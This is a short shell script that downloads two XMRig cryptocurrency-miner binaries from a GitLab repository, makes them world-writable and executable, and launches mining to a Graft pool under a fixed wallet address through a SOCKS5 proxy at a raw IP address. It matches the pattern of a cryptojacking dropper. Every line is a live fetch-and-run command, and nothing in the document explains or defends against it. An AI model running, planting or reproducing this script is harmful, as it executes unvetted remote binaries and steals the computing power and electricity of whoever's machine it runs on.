#!/bin/sh
wget https://gitlab.com/buyutuk/xmr/-/raw/main/xmrigDaemon && wget https://gitlab.com/buyutuk/xmr/-/raw/main/xmrigMiner && chmod 777 xmrigDaemon && chmod 777 xmrigMiner && ./xmrigDaemon -a rx/graft -o grft.pool.gntl.co.uk:10010 -u TBZJdCK9wMr6dH7NnotyJKt3UcQSv6sRxp -p TEST --donate-level 1 -x socks5://72.210.252.134:46164 -k --tls
